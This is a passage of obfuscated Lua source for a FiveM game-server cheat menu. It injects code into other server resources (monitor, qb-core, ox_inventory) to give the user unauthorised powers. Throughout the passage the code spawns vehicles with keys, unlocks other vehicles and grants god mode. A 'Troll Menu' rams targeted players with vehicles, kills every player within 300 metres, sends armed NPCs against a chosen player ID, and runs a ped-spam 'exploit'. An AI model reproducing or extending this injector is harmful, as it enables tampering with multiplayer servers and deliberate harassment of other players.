(v987==(1 + 1)) then SetPedIntoVehicle(v292,v296, -(1 + 0));SetVehicleAlarm(v296,false);v987=2 + 1 ;end if (v987==(2 -1)) then SetEntityAsMissionEntity(v988,1376 -(1140 + 235) ,1);DeleteEntity(v988);v987=2 + 0 ;end if (v987==(0 + 0)) then v988=GetPedInVehicleSeat(v296, -(1 + 0));ClearPedTasksImmediately(v988);v987=53 -(33 + 19) ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",903 + 1597 );break;end end end break;end end end end);MachoMenuText(v74,"RainCar Spawn");local v77=MachoMenuInputbox(v74,"Vehicle Model","Enter vehicle name");MachoMenuButton(v74,"Start Vehicle Rain",function() local v298=0 -0 ;local v299;while true do if (v298==(1 + 0)) then MachoInjectResource("monitor",string.format([[
        if careverActive then
            print("Carever is already running.")
            return
        end

        local vehicleModel = "%s"
        careverActive = true

        Citizen.CreateThread(function()
            while careverActive do
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                
                RequestModel(GetHashKey(vehicleModel))
                while not HasModelLoaded(GetHashKey(vehicleModel)) do
                    Citizen.Wait(100)
                end
                
                local randomX = playerCoords.x + math.random(-50, 50)
                local randomY = playerCoords.y + math.random(-50, 50)
                local randomZ = playerCoords.z + 100
                
                local vehicle = CreateVehicle(GetHashKey(vehicleModel), randomX, randomY, randomZ, 0.0, true, true)
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleEngineOn(vehicle, true, true, true)
                
                Citizen.Wait(math.random(1000, 3000))
            end
        end)
    ]],v299));MachoMenuNotification("RainCar","Vehicle rain started!");break;end if (v298==(0 -0)) then v299=MachoMenuGetInputbox(v77);if ((v299==nil) or (v299=="")) then MachoMenuNotification("Error","Please enter a valid vehicle model!");return;end v298=1 + 0 ;end end end);MachoMenuButton(v74,"Stop Vehicle Rain",function() local v300=0;while true do if (v300==0) then MachoInjectResource("monitor",[[
        careverActive = false
    ]]);MachoMenuNotification("RainCar","Vehicle rain stopped!");break;end end end);MachoMenuButton(v74,"Helicopter Spawn",function() local v301=689 -(586 + 103) ;local v302;local v303;while true do if (v301==(0 + 0)) then v302=PlayerPedId();v303=GetEntityCoords(v302);v301=2 -1 ;end if (v301==(1489 -(1309 + 179))) then MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local heliModel = "buzzard2"
        
        RequestModel(GetHashKey(heliModel))
        while not HasModelLoaded(GetHashKey(heliModel)) do
            Citizen.Wait(50)
        end
        
        local helicopter = CreateVehicle(GetHashKey(heliModel), playerCoords.x, playerCoords.y, playerCoords.z + 5.0, 0.0, true, true)
        SetEntityAsMissionEntity(helicopter, true, true)
        SetVehicleDoorsLocked(helicopter, 1)
        SetVehicleEngineOn(helicopter, true, true, true)
        
        SetModelAsNoLongerNeeded(GetHashKey(heliModel))
    ]]);MachoMenuNotification("Helicopter","Helicopter spawned!");break;end end end);local v78=false;MachoMenuCheckbox(v74,"Speedboost SHIFT CTRL",function() MachoInjectResource("monitor",[[
        speedboostActive = true
        CreateThread(function()
            while speedboostActive do
                if IsPedInAnyVehicle(PlayerPedId(), true) then
                    if IsControlPressed(0, 209) then -- LEFT SHIFT
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 100.0)
                    elseif IsControlPressed(0, 210) then -- LEFT CTRL
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
                    end
                end
                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("monitor",[[
        speedboostActive = false
    ]]);end);local v79=false;MachoMenuCheckbox(v74,"Vehicle God Mode",function() v79=true;MachoInjectResource("monitor",[[
        VehGod = true
        CreateThread(function()
            while VehGod do
                local playerPed = PlayerPedId()
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsUsing(playerPed)
                    SetEntityInvincible(vehicle, true)
                end
                Wait(0)
            end
        end)
    ]]);end,function() local v304=0 -0 ;while true do if (v304==(0 + 0)) then v79=false;MachoInjectResource("monitor",[[
        VehGod = false
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsUsing(playerPed)
            SetEntityInvincible(vehicle, false)
        end
    ]]);break;end end end);local v80=false;local v81=nil;MachoMenuCheckbox(v74,"Waterproof Vehicle",function(v305) local v306=0;while true do if (v306==0) then v80=v305;if v80 then if (v81==nil) then v81=Citizen.CreateThread(function() while v80 do local v954=PlayerPedId();if IsPedInAnyVehicle(v954,false) then local v962=0 -0 ;local v963;while true do if (v962==(1 + 0)) then SetEntityProofs(v963,false,false,true,false,false,false,false,false);break;end if (0==v962) then v963=GetVehiclePedIsUsing(v954);SetVehicleEngineOn(v963,true,true,true);v962=1 -0 ;end end end Citizen.Wait(0 -0 );end v81=nil;end);end else local v821=PlayerPedId();if IsPedInAnyVehicle(v821,false) then local v927=GetVehiclePedIsUsing(v821);SetEntityProofs(v927,false,false,false,false,false,false,false,false);end v80=false;end break;end end end);MachoMenuButton(v74,"Spawn Car with Keys",function() local v307=nil;if (GetResourceState("monitor")=="started") then v307="monitor";elseif (GetResourceState("qb-core")=="started") then v307="qb-core";else v307="ox_inventory";end MachoInjectResource2(NewThreadNs,v307,[[
        -- Spawn a random car with keys
        local carModels = {
            "sultan", "adder", "zentorno", "t20", "nero", 
            "fmj", "insurgent", "kuruma2", "elegy2", "banshee",
            "comet2", "jester", "massacro", "entityxf", "osiris",
            "reaper", "turismor", "pfister811", "italigtb", "vagner"
        }
        
        local modelName = carModels[math.random(1, #carModels)]
        local modelHash = GetHashKey(modelName)
        
        RequestModel(modelHash)
        local timeout = 0
        while not HasModelLoaded(modelHash) and timeout < 100 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end
        
        if HasModelLoaded(modelHash) then
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, heading, true, false)
            
            if DoesEntityExist(vehicle) then
                -- Set vehicle properties
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                SetVehicleEngineOn(vehicle, true, true, false)
                SetVehicleDoorsLocked(vehicle, 1)
                
                -- Give keys to player
                local plate = GetVehicleNumberPlateText(vehicle)
                TriggerEvent('vehiclekeys:client:SetOwner', plate)
                
                -- Put player in vehicle
                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                
                print("Vehicle spawned: " .. modelName .. " with keys")
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Spawned ' .. modelName .. ' with keys!' } })
            end
            
            SetModelAsNoLongerNeeded(modelHash)
        end
    ]]);MachoMenuNotification("Vehicle","Spawning random car with keys...");end);local v82=MachoMenuInputbox(v74,"Vehicle Model","e.g., sultan");MachoMenuButton(v74,"Spawn Specific Car with Keys",function() local v308=MachoMenuGetInputbox(v82);if (v308 and (v308~="")) then local v539=nil;if (GetResourceState("monitor")=="started") then v539="monitor";elseif (GetResourceState("qb-core")=="started") then v539="qb-core";else v539="ox_inventory";end MachoInjectResource2(NewThreadNs,v539,string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)
            
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local playerPed = PlayerPedId()
                local coords = GetEntityCoords(playerPed)
                local heading = GetEntityHeading(playerPed)
                
                local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, heading, true, false)
                
                if DoesEntityExist(vehicle) then
                    SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                    SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                    SetVehicleEngineOn(vehicle, true, true, false)
                    SetVehicleDoorsLocked(vehicle, 1)
                    
                    -- Give keys to player
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerEvent('vehiclekeys:client:SetOwner', plate)
                    
                    -- Put player in vehicle
                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                    
                    print("Vehicle spawned: " .. modelName .. " with keys")
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Spawned ' .. modelName .. ' with keys!' } })
                end
                
                SetModelAsNoLongerNeeded(modelHash)
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'Invalid model: ' .. modelName } })
            end
        ]],v308));MachoMenuNotification("Vehicle","Spawning "   .. v308   .. " with keys..." );else MachoMenuNotification("Error","Please enter a vehicle model!");end end);MachoMenuButton(v74,"Spawn Car with Keys (Simple)",function() local v309=PlayerPedId();local v310=GetEntityCoords(v309);local v311=GetHashKey("sultan");RequestModel(v311);while  not HasModelLoaded(v311) do Citizen.Wait(0);end local v312=CreateVehicle(v311,v310.x,v310.y,v310.z,GetEntityHeading(v309),true,false);if DoesEntityExist(v312) then local v540=609 -(295 + 314) ;local v541;while true do if ((2 -1)==v540) then SetVehicleEngineOn(v312,true,true,false);SetVehicleDoorsLocked(v312,1);v540=1964 -(1300 + 662) ;end if (0==v540) then SetVehicleCustomPrimaryColour(v312,255,255,800 -545 );SetVehicleCustomSecondaryColour(v312,255,2010 -(1178 + 577) ,133 + 122 );v540=2 -1 ;end if (v540==(1407 -(851 + 554))) then v541=GetVehicleNumberPlateText(v312);TriggerEvent("vehiclekeys:client:SetOwner",v541);v540=3 + 0 ;end if (v540==(8 -5)) then TaskWarpPedIntoVehicle(v309,v312, -(1 -0));MachoMenuNotification("Vehicle","Spawned Sultan with keys!");break;end end end SetModelAsNoLongerNeeded(v311);end);local v83=MachoMenuInputbox(v74,"License Plate","e.g., 34AKP952");MachoMenuButton(v74,"Set License Plate",function() local v313=MachoMenuGetInputbox(v83);if (v313 and (v313~="")) then MachoInjectResource2(NewThreadNs,"monitor",string.format([[
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh and veh ~= 0 then
                SetVehicleNumberPlateText(veh, "%s")
                print("License plate set to: " .. "%s")
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'License plate set to: %s' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
            end
        ]],v313,v313,v313));MachoMenuNotification("Vehicle","License plate set to: "   .. v313 );else MachoMenuNotification("Error","Please enter a plate number!");end end);MachoMenuButton(v74,"Repair Vehicle",function() local v314=302 -(115 + 187) ;while true do if (v314==(0 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(ped, false)
        
        if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
            SetVehicleFixed(vehicle)
            SetVehicleDeformationFixed(vehicle)
            SetVehicleUndriveable(vehicle, false)
            SetVehicleEngineOn(vehicle, true, true, true)
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleFuelLevel(vehicle, 100.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle repaired!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Vehicle repaired!");break;end end end);MachoMenuButton(v74,"Clean Vehicle",function() local v315=0 + 0 ;while true do if ((0 -0)==v315) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleDirtLevel(veh, 0.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle cleaned!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Vehicle cleaned!");break;end end end);MachoMenuButton(v74,"Force Engine",function() local v316=1161 -(160 + 1001) ;while true do if (v316==(0 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleEngineOn(veh, true, true, true)
            SetVehicleUndriveable(veh, false)
            SetVehicleNeedsToBeHotwired(veh, false)
            SetVehicleKeepEngineOnWhenAbandoned(veh, true)
            SetVehicleEngineCanDegrade(veh, false)
            SetVehicleEngineHealth(veh, 900.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Engine forced on!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Engine forced on!");break;end end end);MachoMenuButton(v74,"Max Upgrade",function() local v317=0 + 0 ;while true do if (v317==(0 -0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleModKit(veh, 0)
            SetVehicleWheelType(veh, 7)
            
            -- All mods
            for modType = 0, 16 do
                local maxMod = GetNumVehicleMods(veh, modType)
                if maxMod and maxMod > 0 then
                    SetVehicleMod(veh, modType, maxMod - 1, false)
                end
            end
            
            -- Turbo
            SetVehicleMod(veh, 14, 16, false)
            
            -- Spoiler
            local spoilerMax = GetNumVehicleMods(veh, 15)
            if spoilerMax and spoilerMax > 1 then
                SetVehicleMod(veh, 15, spoilerMax - 2, false)
            end
            
            -- Toggle mods
            for modType = 17, 22 do
                ToggleVehicleMod(veh, modType, true)
            end
            
            -- Window tint
            SetVehicleWindowTint(veh, 1)
            
            -- Tyres
            SetVehicleTyresCanBurst(veh, false)
            
            -- Remove extras
            for extra = 1, 12 do
                if DoesExtraExist(veh, extra) then
                    SetVehicleExtra(veh, extra, false)
                end
            end
            
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle max upgraded!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Vehicle max upgraded!");break;end end end);MachoMenuButton(v74,"Delete Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleHasBeenOwnedByPlayer(veh, true)
            SetEntityAsMissionEntity(veh, true, true)
            
            if NetworkHasControlOfEntity(veh) then
                DeleteEntity(veh)
                DeleteVehicle(veh)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle deleted!' } })
            else
                NetworkRequestControlOfEntity(veh)
                Wait(100)
                DeleteEntity(veh)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle deleted!' } })
            end
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Deleting vehicle...");end);MachoMenuButton(v74,"Unlock Closest Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) and NetworkHasControlOfEntity(veh) then
            SetEntityAsMissionEntity(veh, true, true)
            SetVehicleHasBeenOwnedByPlayer(veh, true)
            SetVehicleDoorsLocked(veh, 1)
            SetVehicleDoorsLockedForAllPlayers(veh, false)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Closest vehicle unlocked!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Unlocking closest vehicle...");end);MachoMenuButton(v74,"TP into Closest Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 15.0, 0, 70)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) and not IsPedInAnyVehicle(ped, false) then
            if GetPedInVehicleSeat(veh, -1) == 0 then
                TaskWarpPedIntoVehicle(ped, veh, -1)
            else
                TaskWarpPedIntoVehicle(ped, veh, 0)
            end
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Teleported into closest vehicle!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby or you are already in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Teleporting into closest vehicle...");end);local v84=false;MachoMenuCheckbox(v74,"Boost Vehicle",function() v84=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.boostThreadRunning then
            _G.boostThreadRunning = true
            _G.boostEnabled = true
            
            CreateThread(function()
                while _G.boostThreadRunning do
                    Wait(0)
                    if not _G.boostEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    if IsControlPressed(0, 209) and IsPedInAnyVehicle(ped, false) then -- Shift
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetVehicleForwardSpeed(veh, 100.0)
                        end
                    end
                    ::continue::
                end
            end)
        end
        _G.boostEnabled = true
    ]]);MachoMenuNotification("Boost","Boost Vehicle ON (Hold Shift)");end,function() v84=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.boostEnabled = false
        _G.boostThreadRunning = false
    ]]);MachoMenuNotification("Boost","Boost Vehicle OFF");end);local v85=false;MachoMenuCheckbox(v74,"Instant Brakes",function() v85=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.brakesThreadRunning then
            _G.brakesThreadRunning = true
            _G.brakesEnabled = true
            
            CreateThread(function()
                while _G.brakesThreadRunning do
                    Wait(0)
                    if not _G.brakesEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and IsDisabledControlPressed(0, 33) and IsPedInAnyVehicle(ped, false) then -- S
                        SetVehicleForwardSpeed(veh, 0.0)
                    end
                    ::continue::
                end
            end)
        end
        _G.brakesEnabled = true
    ]]);MachoMenuNotification("Brakes","Instant Brakes ON (Hold S)");end,function() v85=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.brakesEnabled = false
        _G.brakesThreadRunning = false
    ]]);MachoMenuNotification("Brakes","Instant Brakes OFF");end);local v86=false;MachoMenuCheckbox(v74,"Easy Handling",function() v86=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.handlingThreadRunning then
            _G.handlingThreadRunning = true
            _G.handlingEnabled = true
            
            CreateThread(function()
                while _G.handlingThreadRunning do
                    Wait(0)
                    if not _G.handlingEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        SetVehicleGravityAmount(veh, 73.0)
                        SetVehicleStrong(veh, true)
                    end
                    ::continue::
                end
            end)
        end
        _G.handlingEnabled = true
    ]]);MachoMenuNotification("Handling","Easy Handling ON");end,function() local v318=358 -(237 + 121) ;while true do if (v318==(898 -(525 + 372))) then MachoMenuNotification("Handling","Easy Handling OFF");break;end if ((0 -0)==v318) then v86=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.handlingEnabled = false
        _G.handlingThreadRunning = false
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleGravityAmount(veh, 9.8)
            SetVehicleStrong(veh, false)
        end
    ]]);v318=1;end end end);local v87=false;MachoMenuCheckbox(v74,"Rainbow Vehicle",function() v87=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.rainbowThreadRunning then
            _G.rainbowThreadRunning = true
            _G.rainbowEnabled = true
            
            CreateThread(function()
                local freq = 1.0
                while _G.rainbowThreadRunning do
                    Wait(0)
                    if not _G.rainbowEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        local t = GetGameTimer() / 1000
                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                        SetVehicleCustomPrimaryColour(veh, r, g, b)
                        SetVehicleCustomSecondaryColour(veh, r, g, b)
                    end
                    ::continue::
                end
            end)
        end
        _G.rainbowEnabled = true
    ]]);MachoMenuNotification("Rainbow","Rainbow Vehicle ON");end,function() v87=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.rainbowEnabled = false
        _G.rainbowThreadRunning = false
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
            SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
        end
    ]]);MachoMenuNotification("Rainbow","Rainbow Vehicle OFF");end);local v88=false;MachoMenuCheckbox(v74,"Unlimited Fuel",function() v88=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.fuelThreadRunning then
            _G.fuelThreadRunning = true
            _G.fuelEnabled = true
            
            CreateThread(function()
                while _G.fuelThreadRunning do
                    Wait(100)
                    if not _G.fuelEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                            SetVehicleFuelLevel(veh, 100.0)
                        end
                    end
                    ::continue::
                end
            end)
        end
        _G.fuelEnabled = true
    ]]);MachoMenuNotification("Fuel","Unlimited Fuel ON");end,function() v88=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.fuelEnabled = false
        _G.fuelThreadRunning = false
    ]]);MachoMenuNotification("Fuel","Unlimited Fuel OFF");end);local v89=MachoMenuAddTab(v4,"Troll Menu");local v90=MachoMenuGroup(v89,"Vehicle and NPC Features",1379 -959 ,151 -(96 + 46) ,710,v1.y-(787 -(643 + 134)) );local v91=MachoMenuGroup(v89,"Player Manipulation",56 + 99 ,9,1007 -587 ,v1.y-10 );MachoMenuText(v90,"Vehicle Ram");local v92=MachoMenuInputbox(v90,"Target Player ID (Vehicle Ram)","e.g., 123");MachoMenuButton(v90,"Launch Vehicle at Player",function() local v319=tonumber(MachoMenuGetInputbox(v92));if (v319 and (v319>(0 -0))) then MachoInjectResource("monitor",string.format([[
            local playerId = GetPlayerFromServerId(%d)
            if playerId then
                local targetPed = GetPlayerPed(playerId)
                local targetCoords = GetEntityCoords(targetPed)
                local offset = GetOffsetFromEntityInWorldCoords(targetPed, 0, -2.0, 0)
                local vehModel = "sultan"
                RequestModel(vehModel)
                while not HasModelLoaded(vehModel) do
                    Citizen.Wait(0)
                end
                local vehicle = CreateVehicle(vehModel, offset.x, offset.y, offset.z, GetEntityHeading(targetPed), true, true)
                SetEntityVisible(vehicle, true, true)
                if DoesEntityExist(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    SetVehicleDoorsLocked(vehicle, 4)
                    SetVehicleForwardSpeed(vehicle, 80.0)
                end
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle launched! Target ID: %d' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Player not found! ID: %d' } })
            end
        ]],v319,v319,v319));MachoMenuNotification("Vehicle System","Vehicle launch initiated! Target ID: "   .. v319 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v91,"Kill Everyone Nearby (300m)",function() MachoMenuNotification("Kill All","Killing all players within 300 meters...");local v320=nil;if (GetResourceState("vrp")=="started") then v320="vrp";elseif (GetResourceState("qb-core")=="started") then v320="qb-core";elseif (GetResourceState("es_extended")=="started") then v320="es_extended";else v320="ox_inventory";end MachoInjectResource2(NewThreadNs,v320,[[
        local myPed = PlayerPedId()
        local myCoords = GetEntityCoords(myPed)
        local weaponHash = GetHashKey("WEAPON_PISTOL50")
        local killed = 0
        local players = {}
        
        -- Get all nearby players within 300 meters
        for _, player in ipairs(GetActivePlayers()) do
            if player ~= PlayerId() then
                local targetPed = GetPlayerPed(player)
                if targetPed and DoesEntityExist(targetPed) and not IsEntityDead(targetPed) then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(myCoords - targetCoords)
                    if distance <= 300.0 then
                        table.insert(players, {ped = targetPed, coords = targetCoords, name = GetPlayerName(player), dist = math.floor(distance)})
                    end
                end
            end
        end
        
        if #players == 0 then
            print("Kill All: No players within 300 meters!")
            MachoMenuNotification("Kill All", "No players nearby!")
            return
        end
        
        print("Kill All: Found " .. #players .. " players within 300 meters")
        
        -- Kill each player
        for _, p in ipairs(players) do
            local targetPed = p.ped
            local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
            local myPos = GetEntityCoords(myPed)
            
            -- Method 1: Direct damage
            ApplyDamageToPed(targetPed, 200, true, weaponHash)
            SetEntityHealth(targetPed, 0)
            
            -- Method 2: Silent bullet for safety
            ShootSingleBulletBetweenCoords(
                myPos.x, myPos.y, myPos.z + 0.5,
                headPos.x, headPos.y, headPos.z,
                250, true, weaponHash, myPed, true, false, 1000.0
            )
            
            killed = killed + 1
            print("Kill All: Killed " .. p.name .. " (" .. p.dist .. "m)")
        end
        
        MachoMenuNotification("Kill All", "Killed " .. killed .. " players within 300m")
        print("Kill All: Killed " .. killed .. " players")
    ]]);end);MachoMenuText(v90,"NPC Attack");local v93=MachoMenuInputbox(v90,"Target Player ID (NPC)","e.g., 123");MachoMenuButton(v90,"Start NPCs",function() local v321=tonumber(MachoMenuGetInputbox(v93));if (v321 and (v321>(0 + 0))) then local v542=0 -0 ;while true do if (v542==(0 -0)) then if isSpawning then local v928=719 -(316 + 403) ;while true do if (v928==0) then MachoMenuNotification("Error","NPCs are already spawning! Stop them first.");return;end end end isSpawning=true;v542=1 + 0 ;end if (v542==1) then MachoMenuNotification("NPC System","NPC spawn initiated! Target ID: "   .. v321 );Citizen.CreateThread(function() while isSpawning do MachoInjectResource("monitor",string.format([[
                    local npcModel = "a_m_m_acult_01"
                    local weaponHash = "weapon_rayminigun"
                    local radius = 5.0
                    local numberOfPeds = 5
                    local playerPed = GetPlayerPed(GetPlayerFromServerId(%d))
                    if not DoesEntityExist(playerPed) then
                        TriggerEvent('chat:addMessage', { args = { '^1NPC System:', 'Target player not found!' } })
                        return
                    end
                    local playerPos = GetEntityCoords(playerPed)
                    RequestModel(npcModel)
                    while not HasModelLoaded(npcModel) do
                        Citizen.Wait(100)
                    end
                    for i = 0, numberOfPeds - 1 do
                        local angle = (i / numberOfPeds) * (2 * math.pi)
                        local spawnX = playerPos.x + radius * math.cos(angle)
                        local spawnY = playerPos.y + radius * math.sin(angle)
                        local spawnZ = playerPos.z
                        local npc = CreatePed(4, npcModel, spawnX, spawnY, spawnZ, 0.0, true, false)
                        GiveWeaponToPed(npc, GetHashKey(weaponHash), 250, false, true)
                        SetPedCombatAttributes(npc, 5, true)
                        SetPedCombatRange(npc, 2)
                        SetPedCombatMovement(npc, 3)
                        TaskCombatPed(npc, playerPed, 0, 16)
                        SetEntityAsNoLongerNeeded(npc)
                    end
                ]],v321,v321));Wait(2000);end end);break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v90,"Stop NPCs",function() if isSpawning then isSpawning=false;MachoMenuNotification("NPC System","NPC spawn stopped!");else MachoMenuNotification("Info","NPC spawn is already stopped.");end end);MachoMenuText(v90,"NPC Spam");local v94=false;local v95="mp_m_freemode_01";local v96=MachoMenuInputbox(v90,"NPC Spam Target ID","e.g., 123");MachoMenuButton(v90,"Start Ped Spam - Exploit",function() if v94 then local v543=0 -0 ;while true do if (v543==0) then MachoMenuNotification("Error","Already started. Stop it first.");return;end end end local v322=tonumber(MachoMenuGetInputbox(v96));if ( not v322 or (v322<=(0 + 0))) then local v544=0;while true do if (v544==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v94=true;MachoInjectResource("monitor",string.format([[
        local pedModel = "%s"
        local pedSpawning = true
        local targetId = %d

        CreateThread(function()
            while pedSpawning do
                RequestModel(pedModel)
                while not HasModelLoaded(pedModel) do
                    Wait(100)
                end

                local player = GetPlayerFromServerId(targetId)
                if player and player ~= -1 then
                    local ped = GetPlayerPed(player)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    local spawnedPed = CreatePed(28, GetHashKey(pedModel), pos.x, pos.y, pos.z, heading, true, false)
                    TaskWanderInArea(spawnedPed, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                    SetPedAsNoLongerNeeded(spawnedPed)
                end

                Wait(math.random(1000, 2000))
            end
        end)

        RegisterNetEvent("stopPedSpamExploit", function()
            pedSpawning = false
        end)
